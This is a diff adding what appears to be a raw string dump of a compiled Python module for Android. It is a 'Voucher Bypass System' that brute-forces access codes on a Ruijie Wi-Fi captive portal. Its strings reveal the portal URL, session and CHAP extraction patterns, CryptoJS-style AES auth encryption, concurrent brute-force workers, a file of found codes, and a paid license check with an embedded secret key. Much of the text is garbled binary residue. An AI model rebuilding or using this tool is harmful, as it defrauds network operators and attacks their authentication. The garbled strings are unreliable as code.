@@ -1,0 +1,2201 @@
+Android
+14206865
+__cxa_finalize
+__cxa_atexit
+__register_atfork
+PyCapsule_New
+PyStructSequence_InitType
+PyStructSequence_New
+PyStructSequence_SetItem
+PyUnicode_FromString
+PySys_GetObject
+_Py_FalseStruct
+_Py_TrueStruct
+_Py_NoneStruct
+strcmp
+PyInit_core
+PyObject_GetAttrString
+strdup
+PyUnicode_AsUTF8
+PyUnicode_Find
+PyUnicode_GetLength
+PyUnicode_Substring
+PyModule_GetDict
+PyErr_PrintEx
+abort
+PyModuleDef_Init
+_Py_Dealloc
+PyType_IsSubtype
+PySequence_Check
+_PyThreadState_GetCurrent
+Py_MakePendingCalls
+PyEval_SaveThread
+PyEval_AcquireThread
+PyUnicode_Join
+Py_Exit
+PyLong_FromSsize_t
+Py_GenericAlias
+PyNumber_AsSsize_t
+PyErr_Format
+PyDict_SetItem
+_PyDict_NewPresized
+PySequence_Contains
+PyUnicode_FromFormat
+PyNumber_Long
+PyObject_IsSubclass
+PyErr_WriteUnraisable
+PyImport_GetModuleDict
+PyDict_DelItem
+PyThreadState_Get
+PyUnicode_Compare
+PyModule_Type
+PyExc_ImportError
+PyType_Type
+PyExc_Exception
+PyExc_SystemExit
+PyUnicode_Type
+PyExc_TypeError
+PySeqIter_Type
+PyExc_StopIteration
+PyExc_OSError
+PyList_Type
+PyExc_IndexError
+PyExc_BaseException
+PyExc_ValueError
+PyExc_SystemError
+PyExc_GeneratorExit
+PyExc_KeyboardInterrupt
+_PyObject_GC_Resize
+Py_CompileStringExFlags
+PyImport_ExecCodeModule
+PyLong_AsLong
+PyMem_GetAllocator
+PyDict_SetItemString
+PyByteArray_FromObject
+PyCallable_Check
+PyObject_GetAttr
+PyObject_SetAttr
+strlen
+PyDict_MergeFromSeq2
+_PyErr_SetString
+PyErr_GivenExceptionMatches
+_Py_FatalErrorFunc
+PyModule_GetName
+PyImport_ImportModule
+PyErr_NoMemory
+PyObject_LengthHint
+PyLong_AsSsize_t
+PyErr_ExceptionMatches
+_PyLong_Copy
+PyUnicode_FromStringAndSize
+PyUnicode_FromOrdinal
+PyObject_Repr
+PyUnicode_New
+snprintf
+dirname
+dladdr
+strcpy
+strncpy
+strcat
+fprintf
+PySet_New
+PySet_Add
+_PyObject_New
+PyObject_GetIter
+vsprintf
+PyNumber_Add
+PyObject_RichCompareBool
+PyObject_GenericSetAttr
+PyNumber_InPlaceAdd
+PyType_Ready
+PyEval_GetFuncName
+PySequence_List
+PyList_Sort
+_PyType_Lookup
+PyObject_IsInstance
+PyDict_New
+PyObject_CallFunctionObjArgs
+PyNumber_InPlaceOr
+PyObject_SelfIter
+PyModule_NewObject
+strrchr
+strncmp
+PyCMethod_New
+PyObject_SetAttrString
+PyObject_ClearWeakRefs
+PyObject_GC_Del
+PyIter_Next
+PyArg_ParseTuple
+_PyArg_NoKeywords
+PyArg_UnpackTuple
+PyObject_CallMethodObjArgs
+PyObject_Call
+_PyEval_EvalFrameDefault
+PyIter_Send
+Py_BuildValue
+PyCode_Addr2Line
+PyUnstable_Code_NewWithPosOnlyArgs
+PyErr_BadArgument
+PyDict_GetItemString
+PyObject_CallFunction
+Py_GetVersion
+PyModule_GetFilenameObject
+PyErr_WarnEx
+PyUnicode_FindChar
+PyMem_Malloc
+PyObject_Free
+PyObject_Realloc
+PyNumber_Negative
+PyNumber_Subtract
+PyNumber_FloorDivide
+PyOS_snprintf
+PyErr_Occurred
+fflush
+_PyLong_New
+PyObject_Init
+memcmp
+PyTuple_New
+PyList_New
+PyFrozenSet_New
+PyNumber_InPlaceLshift
+PyFloat_FromDouble
+PyComplex_FromDoubles
+PyByteArray_FromStringAndSize
+_PySet_NextEntry
+PyDict_GetItem
+PyUnicode_DecodeUTF8
+_PyUnicode_InternImmortal
+PyImport_ImportFrozenModule
+printf
+PyModule_GetDef
+PyModule_GetState
+PyModule_ExecDef
+PyObject_Str
+PyObject_RichCompare
+PyArg_ParseTupleAndKeywords
+strchr
+PyUnicode_Concat
+PyModule_FromDefAndSpec2
+PyState_FindModule
+PyState_AddModule
+dlopen
+dlerror
+dlsym
+PyBytes_FromString
+PySys_SetObject
+PyFunction_Type
+PyMethod_Type
+PyExc_RuntimeError
+PyGen_Type
+PyFrame_Type
+PyCode_Type
+PyExc_AttributeError
+PyExc_OverflowError
+PyByteArray_Type
+PyBytes_Type
+PyDict_Type
+PyExc_UnboundLocalError
+PyExc_NameError
+PyExc_RecursionError
+PyExc_MemoryError
+PyTuple_Type
+PyLong_Type
+PySlice_Type
+stderr
+PyRange_Type
+PyFloat_Type
+PyCFunction_Type
+PyBaseObject_Type
+_Py_NotImplementedStruct
+PyTraceBack_Type
+PyCoro_Type
+PyAsyncGen_Type
+PyExc_StopAsyncIteration
+_PyIntrinsics_UnaryFunctions
+_PyRuntime
+PyExc_KeyError
+PyExc_ImportWarning
+PySet_Type
+Py_GenericAliasType
+PyBool_Type
+PyComplex_Type
+_Py_EllipsisObject
+PyFrozenSet_Type
+PyEllipsis_Type
+PyImport_FrozenModules
+PyModuleDef_Type
+getauxval
+memset
+memcpy
+__system_property_get
+memfd_create
+__stack_chk_fail
+libdl.so
+LIBC
+libc.so
+LIBC_R
+/data/data/com.termux/files/usr/bin/../../usr/lib
+libm.so
+libpython3.13.so
+ffffff
+fffff
+ $(,048<
+errors
+name '%U' is not defined
+type '%s' is not subscriptable
+generator ignored GeneratorExit
+ag_await
+iter() returned non-iterator of type '%s'
+isupper
+rstrip
+isnumeric
+compiled_module
+NULL
+unsupported operand type(s) for -: '%s' and '%s'
+iter_modules
+utf8
+PyInitU_%s
+directory of the containing binary
+compiled_cell
+newline
+cannot import name %R from %R (%S)
+%s() takes from %zd to %zd positional argument%s but %zd%s were given
+cr_code
+'async with' received an object from __aexit__ that does not implement __await__: %s
+f_trace_lines
+isdigit
+islower
+get_data
+func
+Missing special value for %d
+__compiled__
+__name__ must be set to a string object
+setting function's dictionary to a non-dict
+non-constant return value
+<compiled_coroutine object %s at %p>
+cr_origin
+athrow(): asynchronous generator is already running
+count
+rfind
+format_map
+values
+read_bytes
+<nuitka_resource_reader for '%s'>
+sentinel
+compiled_generator
+compiled_coroutine_wrapper
+encoding
+input
+strings are too large to concat
+__str__ returned non-string (type %s)
+getgeneratorstate
+__code__ is not writable in Nuitka
+<bound compiled_method %U of %U>
+im_func
+__self__
+__name__ must be a string
+decode
+endswith
+index
+rjust
+isascii
+unsupported operand type(s) for &: '%s' and 'int'
+exists
+O:get_data
+O:getgeneratorstate
+cooooooooooooooo
+compiled_async_generator
+nuitka_empty_function
+open
+cannot access local variable '%U' where it is not associated with a value
+Ellipsis
+%s() missing %zd required positional argument%s: %s
+compiled_async_generator_wrapped_value
+asend
+aclose
+ljust
+replace
+%s{item %ld}
+Nuitka: import of module '%s' failed unexpectedly despite intended perfect support, please raise a Nuitka issue and compile with an older version of the module in the meantime
+is_file
+context
+O:resource_path
+Micro release number
+standalone
+core
+cooooooccc
+compiled_aiter_wrapper
+__qualname__
+gi_yieldfrom
+object %s can't be used in 'await' expression
+__sizeof__
+f_trace_lines is not writable in Nuitka
+<compiled_cell at %p: empty>
+__package__ != __spec__.parent
+encode
+keys
+child
+ro.arch
+compiled_function
+"Unexpected failure of hard import of 'sys'"
+ object
+__dict__
+'<=' not supported between instances of '%s' and '%s'
+'>=' not supported between instances of '%s' and 'int'
+sequence index must be integer, not '%s'
+%s() got multiple values for argument '%s'
+copy
+aclose(): asynchronous generator is already running
+cannot clear a suspended frame
+-preLoad
+|OOOOO:open
+stem
+core-preLoad
+catching classes that do not inherit from BaseException is not allowed
+ooccc
+getattr(): attribute name must be string
+"Unexpected failure of hard import of 'importlib.resources'"
+can't send non-None value to a just-started generator
+casefold
+insert
+%s.__class__
+unsupported operand type(s) for /: '%s' and '%s'
+-postLoad
+nuitka_resource_reader_files
+<nuitka_module_loader for '%s'>
+GEN_CLOSED
+micro
+name of main module at runtime
+__compiled__\n\nVersion information as a named tuple.
+exception causes must derive from BaseException (%s does not)
+No active exception to reraise
+'<' not supported between instances of '%s' and '%s'
+'>' not supported between instances of 'int' and '%s'
+__await__() returned a coroutine
+<compiled_aiter_wrapper object of %R at %p>
+ag_frame is not writable in Nuitka
+perf trampoline not available
+range() arg 3 must not be zero
+find
+isidentifier
+maketrans
+O|O:module_repr
+exynos9810
+__nuitka_version__
+core-postLoad
+'%s' object is not an iterator
+<unknown module name>
+exceptions must derive from BaseException
+.bytecode
+import types
+_old_GeneratorWrapper = types._GeneratorWrapper
+class GeneratorWrapperEnhanced(_old_GeneratorWrapper):
+    def __init__(self, gen):
+        _old_GeneratorWrapper.__init__(self, gen)
+        if hasattr(gen, 'gi_code'):
+            if gen.gi_code.co_flags & 0x0020:
+                self._GeneratorWrapper__isgen = True
+types._GeneratorWrapper = GeneratorWrapperEnhanced
+import inspect
+_old_get_code_position = inspect._get_code_position
+def _get_code_position(code, instruction_index):
+    try:
+        return _old_get_code_position(code, instruction_index)
+    except StopIteration:
+        return None, None, None, None
+inspect._get_code_position=_get_code_position
+%s() got an unexpected keyword argument '%s'
+async generator already executing
+throw() third argument must be a traceback object
+gi_code
+cannot reuse already awaited aclose()/athrow()
+<compiled_cell at %p: %s object at %p>
+istitle
+zfill
+unsupported operand type(s) for %%: '%s' and 'int'
+O:find_distributions
+'alpha', 'beta', 'candidate', or 'release'
+boolean indicating standalone mode usage
+oooooooooooo
+ooooooooo
+compiled_frame
+nuitka_distribution
+distribution
+_getframemodulename
+readonly attribute
+the function (or other callable) implementing a method
+rindex
+Missing anon value for %d
+get_resource_reader
+importlib.machinery
+not enough values to unpack (expected %d, got %d)
+level must be >= 0
+an integer is required (got type %s)
+importlib._bootstrap
+async generator ignored GeneratorExit
+async generator raised StopIteration
+send
+close
+f_trace is not writable in Nuitka, ignore with '--no-deployment-flag=frame-useless-set-trace'
+rpartition
+unsupported operand type(s) for -: '%s' and 'int'
+parent
+files
+coroutine is being awaited already
+closefd
+, and 
+im_class
+cannot reuse already awaited compiled_coroutine %S
+async generator raised StopAsyncIteration
+'async with' received an object from __aenter__ that does not implement __await__: %s
+athrow
+ag_code is not writable in Nuitka
+can't resolve package from __spec__ or __package__, falling back on __name__ and __path__
+isalpha
+rsplit
+splitlines
+items
+%s[%ld]
+unsupported operand type(s) for +=: '%s' and 'int'
+__fspath__
+__main__
+filename
+PyInit_%s
+O:is_package
+boolean indicating --python-flag=no_docstrings usage
+Cannot recover from the recursive normalization of an exception.
+'<' not supported between instances of 'int' and '%s'
+path_hooks
+nuitka_types_patch
+__globals__
+F.clear(): clear most references held by the frame
+calling %s should have returned an instance of BaseException, not %s
+upper
+popitem
+read_text
+as_posix
+suffix
+find_spec
+create_module
+O|OO:find_spec
+list index out of range
+def empty(): raise RuntimeError('Compiled function bytecode used')
+'%s' object does not support item assignment
+'%s' object does not support the context manager protocol
+__name__
+anext(): asynchronous generator is already running
+cannot 'yield from' a coroutine object in a non-coroutine generator
+cr_await
+f_trace
+Cell is empty
+split
+setdefault
+unsupported operand type(s) for +: '%s' and '%s'
+iterdir
+<nuitka_module_loader>
+main
+__import__
+%s : %s
+__index__ returned non-int (type %s)
+unbound compiled_method %s%s must be called with %s instance as first argument (got %s instance instead)
+'%s' object does not support the asynchronous context manager protocol (missed __aexit__ method)
+<unnamed>
+'<' not supported between instances of '%s' and 'float'
+<compiled_function %U at %p>
+__defaults__
+compiled_async_generator_asend
+ag_running
+unknown location
+translate
+extend
+unsupported operand type(s) for //: '%s' and 'int'
+unsupported operand type(s) for %%: '%s' and '%s'
+find_distributions
+O:iter_modules
+dynamic module '%s' not initialized properly
+O:coroutine
+containing_dir
+boolean indicating onefile mode usage
+no_annotations
+boolean indicating --python-flag=no_annotations usage
+ooboooooooo
+cannot unpack non-iterable %s object
+compiled_coroutine
+importlib_resources
+'%s' object has no attribute '%s'
+meta_path
+ and 
+deepcopy
+the instance to which a method is bound; None for unbound method
+coroutine already executing
+unhashable type: '%s'
+center
+%R returned NULL without setting an exception
+cannot fit 'int' into an index-sized integer
+module_repr
+O|O:load_module
+object
+f_globals
+too many values to unpack (expected %d)
+cooocc
+compiled_method
+co_stacksize
+maximum recursion depth exceeded while normalizing an exception
+IMPORT_HARD_OS
+nuitka_distribution_patch
+clear
+Corrupt object at %s: refcount %ld
+surrogatepass
+load_module
+package
+listdir
+__init__
+Requested resource reader for unhandled module %s
+GEN_RUNNING
+onefile
+A wrapper object for '__aiter__' backwards compatibility.
+'<' not supported between instances of '%s' and 'int'
+NotImplemented
+%s() missing %zd required keyword-only argument%s: %s
+%s() got some positional-only arguments passed as keyword arguments: '%s'
+coroutine raised StopIteration
+cannot reuse already awaited __anext__()/asend()
+cannot clear an executing frame
+%U.%U
+join
+lower
+set iteration raised
+getdlopenflags
+O:get_resource_reader
+CORO_CLOSED
+version_info
+Minor release number
+boolean indicating --python-flag=no_asserts usage
+oooooo
+cocoocccooooo
+__code__
+importlib.resources
+print
+<NULL>
+Can't instantiate abstract class %s with abstract method%s %s
+nuitka_module_loader
+getcoroutinestate
+function's dictionary may not be deleted
+__kwdefaults__ must be set to a dict object
+<non-string>
+generator already executing
+update
+%s() returned a result with an exception set
+Corrupt object at %s: %s
+find_module
+nuitka_resource_reader
+boolean indicating --module usage
+cccccoooooo
+path
+IMPORT_HARD_SYS
+'%s' object does not support the asynchronous context manager protocol
+%s() takes %zd positional argument%s but %zd%s were given
+cannot reuse already awaited coroutine
+cannot fit '%s' into an index-sized integer
+Missing decoding for %d
+Missing blob values
+joinpath
+__enter__
+as_file
+suffixes
+origin
+releaselevel
+release
+_spec_from_module
+%s is not a mapping
+object of type '%s' has no len()
+__init__() should return None, not '%s'
+'>=' not supported between instances of '%s' and '%s'
+im_self
+gi_running
+cr_frame
+cr_code is not writable in Nuitka
+<compiled_coroutine_wrapper object %s at %p>
+ag_code
+startswith
+append
+remove
+reverse
+major
+original_argv0
+empty
+format
+'%s' object is not callable
+instance exception may not have a separate value
+gi_code is not writable in Nuitka
+ag_frame
+None
+capitalize
+partition
+depth
+ooooooo
+oooo
+co_code
+calling %R should have returned an instance of BaseException, not %R
+'>' not supported between instances of '%s' and '%s'
+__compiled_constant__
+<compiled_function %s at %p>
+can't send non-None value to a just-started coroutine
+__await__() returned non-iterator of type '%s'
+lstrip
+O:create_module
+no_asserts
+co_consts
+buffering
+'%s' object has only read-only attributes (assign to %s)
+import os,sys
+if sys.version_info >= (3, 8):
+    from importlib.metadata import Distribution,distribution
+else:
+    from importlib_metadata import Distribution,distribution
+class nuitka_distribution(Distribution):
+    def __init__(self, package_name, path, metadata, entry_points):
+        self.package_name = package_name; self._path = path
+        self.metadata_data = metadata; self.entry_points_data = entry_points
+    def read_text(self, filename):
+        if filename == 'METADATA':
+            return self.metadata_data
+        elif filename == 'entry_points.txt':
+            return self.entry_points_data
+        elif filename == 'top_level.txt':
+            return self.package_name + '\n'
+    def locate_file(self, path):
+        return os.path.join(self._path, path)
+cannot locate package '%s' associated with metadata
+__reduce__
+__closure__
+__qualname__ must be set to a string object
+%s() takes 0 positional arguments but %zd was given
+coroutine ignored GeneratorExit
+can't send non-None value to a just-started async generator
+attribute 'gi_running' of 'generator' objects is not writable
+F.__sizeof__() -> size of F in memory, in bytes
+f_trace_opcodes is not writable in Nuitka
+%s{value %d}
+absolute
+name
+is_package
+exec_module
+O:sys_path_hook
+cannot create method %s
+builtins
+'<=' not supported between instances of '%s' and 'int'
+clone
+__type_params__
+__defaults__ must be set to a tuple object
+__type_params__ must be set to a tuple
+__func__
+exceptions must be classes or instances deriving from BaseException, not %s
+f_locals
+cell_contents
+isspace
+__exit__
+CORO_CREATED
+no_docstrings
+original argv[0] as received by the onefile binary, None otherwise
+%s.%S
+"Unexpected failure of hard import of 'os'"
+'%s' object cannot be interpreted as an integer
+'>' not supported between instances of '%s' and 'float'
+coroutine
+__annotations__ must be set to a dict object
+'%s' object is not subscriptable
+Cannot create compiled_ method from type '%s'
+<compiled_async_generator_asend of %s at %p>
+throw
+__spec__.parent must be a string
+strip
+isdecimal
+unsupported operand type(s) for +: '%s' and 'int'
+can't multiply sequence by non-int of type '%s'
+Critical error loading %s.
+fullname
+open_resource
+Major release number
+cannot access free variable '%s' where it is not associated with a value in enclosing scope
+unbound compiled_method %s%s must be called with %s instance as first argument (got nothing instead)
+__doc__
+__compiled_constant__ is not writable
+__deepcopy__
+first argument must be callable
+generator raised StopIteration
+cr_running
+f_lineno
+f_trace_opcodes
+activate_stack_trampoline
+globals must be a dict
+unsupported operand type(s) for +=: '%s' and '%s'
+is_dir
+unused
+EXTENSION_SUFFIXES
+dynamic module '%s' not initialized properly from def
+ModuleSpec
+O:exec_module
+O:_getframemodulename
+macos_bundle_mode
+<exec>
+'%s' object has no attributes (assign to %s)
+__module__
+__kwdefaults__
+__builtins__
+__reduce_ex__
+<compiled_frame at %p, file %R, line %d, code %S>
+sort
+unsupported operand type(s) for |: '%s' and 'int'
+<module '%s' from %R>
+module
+GEN_SUSPENDED
+minor
+boolean indicating macOS app bundle mode usage
+co_names
+file
+mode
+Cannot recover from MemoryErrors while normalizing exceptions.
+stdout
+sys_path_hook
+|i:__reduce_ex__
+the class associated with a method
+<compiled_async_generator object %s at %p>
+cell_contents cannot be used to delete values Nuitka
+'%s' object is not iterable
+package must be a string
+swapcase
+isprintable
+|OO:read_text
+unknown dlopen() error
+CORO_SUSPENDED
+extension_filename
+loaded extension filename in module/package mode, None otherwise
+co_exceptiontable
+opener
+'>' not supported between instances of '%s' and 'int'
+__compiled__ is not writable
+unbound methods must have non-NULL im_class
+gi_frame
+gi_frame is not writable in Nuitka
+compiled_async_generator_athrow
+isalnum
+title
+set iteration failed
+O:joinpath
+spec
+resource_path
+cccoooooo
+Nuitka_Err_NormalizeException
+IMPORT_HARD_IMPORTLIB__RESOURCES
+lost sys.stdout
+cannot create '%s' instances
+'%s' object does not support the context manager protocol (missed __exit__ method)
+__annotations__
+ positional argument%s (and %zd keyword-only argument%s)
+keywords must be strings
+<compiled_generator object %U at %p>
+'__name__' not in globals
+expandtabs
+fromkeys
+%s{key %d}
+<nuitka_resource_reader_files for package '%s' file %R>
+O|O:find_module
+O:open_resource
+GEN_CREATED
+O:getcoroutinestate
+CORO_RUNNING
+.bytecode
+a__module__
+a__class__
+a__name__
+a__package__
+a__metaclass__
+a__abstractmethods__
+a__closure__
+a__dict__
+a__doc__
+a__file__
+a__path__
+a__enter__
+a__exit__
+a__builtins__
+a__all__
+a__init__
+a__cmp__
+a__iter__
+a__loader__
+a__compiled__
+a__nuitka__
+ainspect
+acompile
+arange
+aopen
+asuper
+asum
+aformat
+a__import__
+abytearray
+astaticmethod
+aclassmethod
+akeys
+aget
+aname
+aglobals
+alocals
+afromlist
+alevel
+aread
+wrwwwbalower
+w/w\apath
+abasename
+adirname
+aabspath
+aisabs
+anormpath
+aexists
+aisdir
+aisfile
+alistdir
+astat
+alstat
+aclose
+agetattr
+a__cached__
+aprint
+aend
+afile
+abytes
+w.w_a__annotations__
+asend
+athrow
+a__spec__
+a_initializing
+aparent
+atypes
+aascii
+apunycode
+aloader
+a__classcell__
+aas_file
+aregister
+a__class_getitem__
+areconfigure
+aencoding
+aline_buffering
+a__match_args__
+a__aenter__
+a__aexit__
+asplit
+aUnpack
+aargs
+.core
+lhltplplsl:l/pL
+lplalsplbloltl-L
+lel0l8ltl.lolnL
+lrlelnldlelrl.lclolmL
+lhltplpl:l/pL
+l1l0l.l4pl.L
+l7pl.l2l4l0L
+l:l2l0l6l0L
+l1l9l2l.L
+l1l6l8l.l0l.l1L	lplolrltlalll-lalsL
+l.lrluliljlilelnleltL	lwlolrlklsl.lclolmL
+lhltplpL
+lblilnl.lolrlgL
+l/lgleltL
+lplolrltlalll-lalsl.lrluliljlilelnleltlwlolrlklsl.lclolmL
+l/lalplil/lalultlhl/lvlolulclhlelrl/L
+l?lllalnlgl=lelnl_lUlSL
+l.lrluliljlileL
+lnleltlwlolrL
+lklsl.lclolmasystem
+aposix
+lplolslilxL
+lclllelalrlclllsa_y_
+w-aget_terminal_size
+l2a_clr
+a_g_
+  _____  _    _ _____       _ _____ ______ 
+ |  __ \| |  | |_   _|     | |_   _|  ____|
+ | |__) | |  | | | |       | | | | | |__   
+ |  _  /| |  | | | |   _   | | | | |  __|
+ | | \ \| |__| |_| |_ | |__| |_| |_| |____ 
+ |_|  \_\____/|_____| \____/|_____|______|
+                                           
+u    Welcome to Voucher Bypass System!
+a_w_
+a_ln
+a_c_
+u[*] Telegram 
+ t.me/zero
+a_g_s_k
+u[*] Device ID : 
+u[*] Expiry    : 
+asubprocess
+acheck_output
+lsleltplilnlglslgleltL
+lslelclulrleL
+lalnldlrlolildl_lildaDEVNULL
+astderr
+adecode
+lultlfl-l8astrip
+lgleltlplrlolpL
+lrlol.lplrloldlulcltl.lmloldlellL
+lnlullpuDEV-
+ahashlib
+amd5
+ahexdigest
+naupper
+L)l/lsltlolrlalglel/lelmlulllaltleldl/l0l/l.lslylsltlelml_ldlelvlilclel_lildl.lslylsT
+nnnauuid
+auuid4
+ahex
+awrite
+lClhlelclklilnlgl.ppaexpiry_status
+aexp_time
+lRlelnldlelrlSlelclrleltlKlelyl2l0l2l6l!l@l#aencode
+asecret_key
+l.lslylsltlelml_lelxlplilrlyl.lslylsalocal_file
+w:lxlpL	lllalsltl_ltlilmleL
+lhlalslha_get_hash
+ajson
+adump
+aload
+patime
+aget_local_exp
+l<a_update_status
+asave_local_exp
+lSlUlCplElSparequests
+a_K_U_
+u?t=
+atimeout
+astatus_code
+lklelylsL
+lelxlplilrlaltlilolnlsL
+lElxlplilrleldL
+lElXlPlIlRlElDL
+lNloltl lRlelglilsltlelrleldL
+lDlElNlIlElDL*lTlilmlel lSlploplflilnlgl lDleltlelcltleldl!l lNlepldl lOlnlllilnlel lClhlelclkl.L
+lSlPlOplFlElDL
+lOlfplllilnlel l/l lClolnplelcltlilolnl lElrplolrL
+lElRplOlRl
+u Days 
+u Hrs remaining
+u Hours 
+u Mins remaining
+aremove
+asleep
+l<aself
+acheck_approval_silent
+a_exit
+arandom
+arandint
+u02x
+u<genexpr>
+u_g_r_m.<locals>.<genexpr>
+as_u
+ap_s_i
+a_g_r_m
+lmlalcl=are
+asub
+umac=[^&]+
+umac=
+aauthority
+a_o_p
+aaccept
+L?ltlelxltl/lhltlmlll,lalpplllilclaltlilolnl/lxlhltlmlll+lxlmlll,lalpplllilclaltlilolnl/lxlmlll;lql=l0l.l9l,l*l/l*l;lql=l0l.l8areferer
+uuser-agent
+LolMlolzlillplal/l5l.l0l l(lLlilnlulxl;l lAlnldlrlolildl l1l0l;l lKl)l lAlpplllelWlelblKliltl/l5l3l7l.l3l6l l(lKlHlTlMlLl,l lllilklel lGlelclklol)l lClhlrlolmlel/l1l3l9l.l0l.l0l.l0l lMlolblilllel lSlalflalrlil/l5l3l7l.l3l6asession
+aheaders
+atimeout
+aurl
+asearch
+u[?&]sessionId=([a-zA-Z0-9]+)
+agroup
+a_g_s_i
+a_o_u2
+abaseurl
+l/lulslelrlnlalmlel_lgleltausername_get_url
+l/lulslelrl/lolnlllilnlel_lilnlfloaonline_info_url
+l/lulslelrl/lllolglolultalogout_url
+u[+] Setup
+aunbind
+a_o_u3
+lglwl_laldplrlelspl=l(l.l*l?l)l&u*/*
+L"lMlolzlillplal/l5l.l0l l(lLlilnlulxl;l lAlnldlrlolildl l1l0l;l lKl)T
+aheaders
+atext
+a_o_u4
+lhlrlelfl=l'l(l.l*l?l)l'l<l/lslclrlilpltl>L
+l.lslelsplilolnl_lulrllliausername_get
+aget_online_info
+aarrange_data
+alogout
+lulslelrlnlalmleL
+lulslelrltlylpleL
+lwlilflildlolgT
+aparams
+ldlaltlaL
+lllilsltlmlaareplace
+w:sl
+lilpl_lrlelqL
+lmlalcl_lrlelquchap_id=([^&]+)&chap_challenge=([^']+)
+lclhlalpl_lildL
+lclhlalpl_lclhlallplelnlgleT
+aget_random_bytes
+akey_iv
+aprev
+aenc_key
+asalt
+adigest
+:nl n:l l0naAES
+anew
+aMODE_CBC
+apad
+ablock_size
+aencrypt
+cSalted__
+abase64
+ab64encode
+lRljlYlklhlwlzlxl$l2l0l1l8l!aget_data
+aextract_chap
+aurllib
+aparse
+aunquote
+aencrypt_cryptojs
+aget_auth
+uip=
+u&mac=
+u&ip_req=
+u&mac_req=
+u&auth=
+apost
+adata
+lslulcplelspL
+lalcplelsplCloldleavoucher
+L	lslelsplilolnlIldasession_id
+lalplilVlelrlslilolna_o_u6
+uaccept-language
+uen-US,en;q=0.9
+ucontent-type
+lalpplllilclaltlilolnl/ljlslolnaorigin
+uhttps://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html?RES=./../expand/res/mrlev58jlgslg49ervu&IS_EG=0&sessionId=
+usec-ch-ua
+u"Chromium";v="139", "Not;A=Brand";v="99"
+usec-ch-ua-mobile
+usec-ch-ua-platform
+u"Android"
+usec-fetch-dest
+aempty
+usec-fetch-mode
+acors
+usec-fetch-site
+usame-origin
+uMozilla/5.0 (Linux; Android 12; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36
+aheaders
+ajson
+atimeout
+atracker
+aattempts
+lllolglolnlUlrllais_recheck
+] SUCCESS: 
+lslulcplelspl.ltlxltwaa_G_S_C_
+lflalillleldL
+lelxlplilrleldlSlTlAL
+lFlAlIlLlElDa_l_v
+asession_url
+a_r_
+u[!] Please run Setup [1] first.
+acharset
+acode_length
+aauth_mgr
+a_lg
+l.lllilmliltl_lrlelalclhleldl.lslylsu[!] 
+ 1 Hour Limit (Success 10) 
+u[!] 
+ 1 Hour 
+ Success Code (
+u[+] Bruteforce starting...
+aaiohttp
+aTCPConnector
+alimit
+aattempts
+aworkers
+astop
+l2Faworker
+u_V_C_.execute.<locals>.worker
+aworker_manager
+u_V_C_.execute.<locals>.worker_manager
+aui_updater
+u_V_C_.execute.<locals>.ui_updater
+aClientSession
+aconnector
+aasyncio
+acreate_task
+agather
+astop
+] Limit Reached: 10 Success Codes Found. Locking Bruteforce...
+alocked
+aexecute
+u_V_C_.execute
+ahas_limit
+aloop
+@amax
+aworkers
+?amin
+achoice
+u_V_C_.execute.<locals>.worker.<locals>.<genexpr>
+aactive_tasks
+aappend
+apop
+acancel
+adone
+astart_time
+] Speed: 
+u.0f
+u/sec | Checked: 
+u | Found: 
+u/10
+u    
+aend
+aflush
+?asplitlines
+u[!] No saved codes found in success.txt
+u[!] No valid codes to check.
+u[*] Rechecking 
+u codes...
+l2as_url
+ais_recheck
+avalid_codes
+wfu[
+] Recheck finished. Valid codes: 
+uPress Enter...
+acheck
+u_R_V_.check
+a_A_M_
+] EXPIRED / DENIED
+athreading
+aThread
+acontinuous_auth_check
+atarget
+adaemon
+astart
+u[1] 
+aSetup
+u[2] 
+aBruteforce
+u[3] 
+aRecheck
+u[4] 
+uReset Expiry Date
+u[0] 
+aExit
+uSelect Option: 
+w1a_S_
+aset
+uPress Enter to return to menu...
+w2u[+] Select Character Set for Bruteforce:
+u[1] Number only 
+u(e.g., 0-9)
+u[2] Lower letter only 
+u(e.g., a-z)
+u[3] Upper letter only 
+u(e.g., A-Z)
+u[4] Mix lower-upper letter 
+u(e.g., a-z, A-Z)
+u[5] Alphanumeric 
+u(Lower letter & number)
+u[0] Back to Main Menu
+w0astring
+adigits
+aascii_lowercase
+w3aascii_uppercase
+w4aascii_letters
+w5u[!] Invalid choice!
+uEnter Code Length (e.g., 6 or 7): 
+u[!] Invalid length! Please enter a valid number.
+?a_V_C_
+lslelsplilolnl_lulrllarun
+aCancelledError
+a_R_V_
+areset_expiry
+] Expiry Date Reset Successful!
+u[*] Checking key approval from online again...
+] Key Approved! New Expiry updated.
+ahas_location
+asys
+azlib
+aping3
+antplib
+amarshal
+aargparse
+adatetime
+atimedelta
+adatetime
+atimedelta
+uurllib.parse
+aquote
+aunquote
+aquote
+uCrypto.PublicKey
+aRSA
+aRSA
+uCrypto.Util.Padding
+apad
+uCrypto.Cipher
+aAES
+aPKCS1_v1_5
+aPKCS1_v1_5
+uCrypto.Random
+aget_random_bytes
+uconcurrent.futures
+aThreadPoolExecutor
+aThreadPoolExecutor
+aurllib3
+auvloop
+aset_event_loop_policy
+aEventLoopPolicy
+adisable_warnings
+aexceptions
+aInsecureRequestWarning
+[1;00m
+[1;32m
+[1;33m
+[1;31m
+[1;34m
+a_b_
+[1;36m
+a_o_u1
+a_o_u5
+a_R_U_
+L	l/lalplil/lklelylsL
+l/lalplil/lsltlaltlulsa_S_U_
+a__qualname__
+lva__firstlineno__
+u_A_M_.__init__
+u_A_M_._get_hash
+u_A_M_.save_local_exp
+u_A_M_.get_local_exp
+u_A_M_.check_approval_silent
+u_A_M_._update_status
+u_A_M_.reset_expiry
+u_A_M_.continuous_auth_check
+aexpiry_status
+aexp_time
+asecret_key
+alocal_file
+a__static_attributes__
+u_S_.__init__
+u_S_.set
+u_S_.unbind
+u_S_.username_get
+u_S_.get_online_info
+u_S_.arrange_data
+u_S_.get_data
+u_S_.extract_chap
+u_S_.encrypt_cryptojs
+u_S_.get_auth
+u_S_.logout
+abaseurl
+ausername_get_url
+aonline_info_url
+alogout_url
+u_V_C_.__init__
+asession_url
+acharset
+acode_length
+aauth_mgr
+u_R_V_.__init__
+aauth_mgr
+amain
+a__main__
+ucore.py
+w_aself
+wxu<module core>
+aself
+aself
+aauth_mgr
+aself
+acharset
+acode_length
+aauth_mgr
+aarr
+wmT	asession
+as_u
+ap_s_i
+an_m
+as_u_s
+whareq
+ares
+as_i
+aa_i
+am_d
+ar_s
+ak_f
+wfan_k
+aself
+aexp
+alast_time
+asession
+asession_id
+avoucher
+atracker
+ais_recheck
